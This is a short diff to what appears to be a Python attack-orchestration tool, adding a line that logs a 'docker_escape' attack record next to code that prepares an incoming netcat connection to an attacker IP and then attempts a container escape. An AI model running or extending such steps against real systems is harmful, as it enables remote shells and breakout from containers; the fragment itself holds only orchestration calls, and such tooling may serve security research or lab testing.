@@ -143,6 +143,7 @@ def main_procedure (attacker_ip, config_file, attack_sequence_file = None, steal
                         mc.prepare(router["id_sess"], C.NETCAT_PORT, LPORT, attacker_ip)
 
                         #tentiamo la connessione da netcat in entrata dall'operazione di copia effettuata da un admin
+                        docker_escape_attack_object = attack_db.create_attack("docker_escape", "0", attacker_ip, C.NETCAT_PORT)
                         escape=mc.docker_escape(atk_sess)
                         if(escape):
                             print(escape)
